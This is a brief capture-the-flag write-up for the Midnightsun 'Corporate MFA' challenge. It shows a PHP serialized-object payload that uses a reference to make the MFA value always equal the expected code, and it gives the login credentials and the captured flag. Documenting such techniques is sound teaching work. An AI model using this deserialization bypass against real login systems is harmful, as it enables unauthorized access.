#Midnightsun Corporate MFA

**tl;dr**

+ 
+ 
+ 





## Challenge description

The source for this corporate-zer trust multi factor login portal has been leaked! Figure ot how to defeat the super-secure one time code.

## Initial analysis

We are provided with the `source code`. The application is a login page which takes username, password and an MFA token. There are two files index.php and User.php. 
The input is then serialised `serialize((object)$_POST)` and send to User class. Ananlysing the User.php, firstly `username === 'D0loresH4ze'` so we have to set the username the same, with the reference to Mr. Robot we find the password to be rasmuslerdorf.
For the MFA check `(int)$this->userData->mfa === $this->userData->_correctValue;` 

So we should create an object which will that will create MFA wrt _correctValue. So the following code will generate the serialised value. 
`class User
{
    public $username = "D0loresH4ze";
    public $password = "rasmuslerdorf";
    public $mfa;
    public $_correctValue;
}

$user = new User();
$user->mfa =& $user->_correctValue;

echo base64_encode(serialize($user));`

When we submit the serialised string, we bypass the three checks and the input gives us the flag `midnight{395E160F-4D7A99EF-08E6799741B5}`


## Flag

**FLAG**: `midnight{395E160F-4D7A99EF-08E6799741B5}`

For further queries, please DM me on Twitter: <https://twitter.com/m0n574>.
